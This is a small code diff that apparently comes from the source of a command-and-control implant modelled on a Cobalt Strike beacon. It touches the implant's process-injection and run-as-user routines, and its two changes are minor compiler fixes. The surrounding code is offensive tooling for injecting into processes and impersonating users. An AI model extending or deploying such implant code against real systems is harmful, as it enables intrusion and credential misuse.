@@ -660,7 +660,8 @@ BOOL ExecuteInjection(INJECTION* injection, CHAR* lpStartAddress, DWORD offset, 
 	BeaconDataParse(&parser, S_PROCINJ_EXECUTE, 128);
 
 	SHORT ordinal; CHAR* lpModuleName; CHAR* lpProcName;
-	while (char method = BeaconDataByte(&parser))
+	char method = 0;
+	while ((method = BeaconDataByte(&parser)) != 0)
 	{
 		switch (method)
 		{
@@ -1187,7 +1188,7 @@ BOOL RunAsUserInternal(LPCCH domain, LPCCH username, LPCCH password, LPCCH cmd, 
 	WCHAR* lpCurrentDirectory = BeaconDataPtr(parser, 0x400);
 
 	STARTUPINFOA si = { sizeof(si) };
-	*lpProcessInfo = { 0 };
+	ZeroMemory(lpProcessInfo, sizeof(*lpProcessInfo));
 
 	GetStartupInfoA(&si);
 	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
